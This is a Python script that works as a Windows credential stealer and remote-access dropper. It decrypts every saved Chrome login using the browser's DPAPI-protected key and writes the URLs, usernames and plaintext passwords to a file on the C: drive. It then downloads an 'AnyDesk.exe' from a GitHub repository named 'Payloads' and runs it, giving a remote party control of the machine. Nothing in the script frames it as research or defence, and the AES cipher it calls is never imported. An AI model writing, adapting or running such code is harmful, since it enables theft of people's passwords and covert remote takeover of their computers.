import os
import json
import base64
import sqlite3
import win32crypt
import shutil
from datetime import datetime, timedelta
import logging
import time
import requests
import subprocess

logging.basicConfig(level=logging.INFO)

# Function to convert Chrome date format to human-readable datetime
def chrome_date_and_time(chrome_data: int) -> datetime:
    return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)

# Function to fetch Chrome encryption key
def fetch_encryption_key() -> bytes:
    local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                    "Google", "Chrome", "User Data", "Local State")
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state_data = json.load(f)

        encrypted_key = base64.b64decode(local_state_data["os_crypt"]["encrypted_key"])
        encrypted_key = encrypted_key[5:]  # Remove DPAPI str
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception as e:
        logging.error(f"Error fetching encryption key: {e}")
        return None

# Function to decrypt passwords
def decrypt_password(encrypted_password: bytes, encryption_key: bytes) -> str:
    try:
        iv = encrypted_password[3:15]
        password = encrypted_password[15:]
        cipher = AES.new(encryption_key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except Exception:
        try:
            return str(win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1])
        except Exception:
            return "Decryption failed"

# Function to extract and decrypt Chrome passwords
def extract_chrome_passwords():
    encryption_key = fetch_encryption_key()
    if not encryption_key:
        logging.error("Failed to fetch encryption key.")
        return

    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                           "Google", "Chrome", "User Data", "Default", "Login Data")
    temp_db_path = "ChromePasswords.db"

    try:
        # Copy the database to a temporary file
        shutil.copyfile(db_path, temp_db_path)

        conn = sqlite3.connect(temp_db_path)
        cursor = conn.cursor()
        cursor.execute("""
            SELECT 
                origin_url, action_url, username_value, password_value, 
                date_created, date_last_used 
            FROM logins
            ORDER BY date_last_used DESC
        """)

        passwords = []
        for row in cursor.fetchall():
            origin_url, action_url, username, encrypted_password, date_created, date_last_used = row
            decrypted_password = decrypt_password(encrypted_password, encryption_key)

            date_created_str = chrome_date_and_time(date_created).strftime('%Y-%m-%d %H:%M:%S') if date_created else "N/A"
            date_last_used_str = chrome_date_and_time(date_last_used).strftime('%Y-%m-%d %H:%M:%S') if date_last_used else "N/A"

            passwords.append({
                "Main URL": origin_url,
                "Login URL": action_url,
                "Username": username,
                "Decrypted Password": decrypted_password,
                "Date Created": date_created_str,
                "Last Used": date_last_used_str,
            })

        # Write the output to a text file
        with open("C:\\browser_credentials.txt", "w") as f:
            if passwords:
                for entry in passwords:
                    f.write("=" * 80 + "\n")
                    for key, value in entry.items():
                        f.write(f"{key}: {value}\n")
            else:
                f.write("No passwords found in the database.\n")

        print("Browser credentials saved to C:\\browser_credentials.txt")

    except sqlite3.Error as e:
        logging.error(f"Database error: {e}")
    except Exception as e:
        logging.error(f"An unexpected error occurred: {e}")
    finally:
        try:
            cursor.close()
        except Exception as e:
            logging.warning(f"Error closing cursor: {e}")

        try:
            conn.close()
        except Exception as e:
            logging.warning(f"Error closing connection: {e}")

        import gc
        gc.collect()

        for attempt in range(5):
            try:
                os.remove(temp_db_path)
                logging.info(f"Temporary file '{temp_db_path}' deleted successfully.")
                break
            except PermissionError as e:
                logging.warning(f"Attempt {attempt + 1}: Failed to delete temporary file: {e}")
                time.sleep(1)
            except Exception as e:
                logging.error(f"Unexpected error when deleting temporary file: {e}")
                break

# Function to download files from GitHub
def download_github_file(url, save_path):
    response = requests.get(url)
    if response.status_code == 200:
        os.makedirs(os.path.dirname(save_path), exist_ok=True)
        with open(save_path, 'wb') as file:
            file.write(response.content)
        print(f"File downloaded successfully and saved to {save_path}")
    else:
        print(f"Failed to download file. Status code: {response.status_code}")

# Main script
if __name__ == "__main__":
    print("\nExtracting Chrome passwords...")
    extract_chrome_passwords()

    print("\nDownloading AnyDesk from GitHub...")
    github_raw_url = "https://github.com/Endizz/Payloads/raw/refs/heads/main/AnyDesk.exe"
    local_save_path = "C:\\AnyDesk.exe"
    download_github_file(github_raw_url, local_save_path)

    # Execute AnyDesk after downloading
    try:
        print("\nExecuting AnyDesk...")
        subprocess.run([local_save_path], check=True)
    except Exception as e:
        logging.error(f"Failed to execute AnyDesk: {e}")
